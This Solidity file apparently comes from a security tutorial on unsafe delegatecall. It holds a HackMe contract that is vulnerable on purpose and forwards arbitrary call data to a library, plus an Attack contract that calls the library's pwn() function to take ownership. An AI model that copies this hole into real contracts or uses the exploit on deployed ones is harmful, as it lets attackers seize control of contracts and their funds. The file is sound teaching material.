// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Unsafe delegatecall

What is delegatecall?
A -> B
run your code inside my context (storage, msg.sender, msg.value, msg.data, etc...)
1. delegatecall preserves context
2. storage layout must be the same for A and B

Vulnerability
2 examples (part 1 and part 2)
Example 1 - Code and demo
*/

contract HackMe {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}


